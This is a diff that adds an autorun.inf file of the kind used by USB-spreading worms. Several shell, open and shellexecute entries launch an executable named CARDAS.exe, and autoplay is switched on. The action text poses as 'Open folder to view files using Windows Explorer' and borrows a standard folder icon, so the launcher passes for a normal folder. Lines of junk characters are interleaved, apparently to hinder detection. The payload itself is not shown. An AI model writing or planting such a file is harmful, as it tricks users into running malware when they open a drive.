@@ -1,0 +1,21 @@
+[autorun]
+^ִֻ׳ְׁךהכמקךהמקל׳ִKASL?Dkalo?dkl?wdqL?DMsal?dkl?wqdkkpd??wqsdP?WQdkl??ASMFSL?vmvckCMKYL??ALSKfAS?DKLPWQDLwqdkasl?גהפûגכÝֲִֶײַֹױÝֲִײֹÝֶÜִֶֻפûכבלאÛִÝֶװֲַײֹÝְֶֻÝײֶֹכאÝײֱֹפû‎üלסÛÝװסכהבװÛÝֻׁװַÝְִÝײֲֹֻÝְֹÝײֹאûפאפûאא
+shellexecute=JANOS\\\\\\\\\\\\CARDAS.exe
+!אפûאכײֶֹהאײֹÝגהײֹÝüû‎הזûלפü‎פ
+shell\explore\command=JANOS\\\\\\\\\\\\CARDAS.exe
+#לÿקלסכהזכגֶציהגחץ‎צי
+open=JANOS\\\\\\\\\\\CARDAS.exe
+@גפûכזאֲÝהצי‎ְצהי‎אכפû‎גכפû‎
+!icon=ljubi\\\\\\\\\\\\ljubac.exe
+&כְִֶװûכהגÙֶציגאעכ‏לûüבפהזסכאפזגהÝײֹ
+action=Open folder to view files using Windows Explorer
+$אûפִג‎זַהיÝֲציÝְבכהûפ‎גהװÝֲֶֹÝ
+USEAUTOPLAY=1
+&אפûכהגזהציÝגאהצי‎אצֱֻװ
+~הֲÝֻפהÝְִ‎צגכהיÝֲַהיÝײלüהאפû‎האװִÝֲײֹ
+shell\open\command=JANOS\\\\\\\\\\\\CARDAS.exe
+>גפûהֲÝֶיהאÝציהזגיבפû‎הבּÝֶװÛֲִֶׁÝװÛ
+Shell\open\command=JANOS\\\\\\\\\\\\CARDAS.exe
+<אפûגהַÝֶצהיֲÝײְִֹציÝֱֶֻײֹÝִגציÝ
+icon=%SystemRoot%\system32\SHELL32.dll,4
+&ףציורחשךלאכבßûגאִװÛÝְִֶכפÝֶאכהחץיגה‎ציגכ
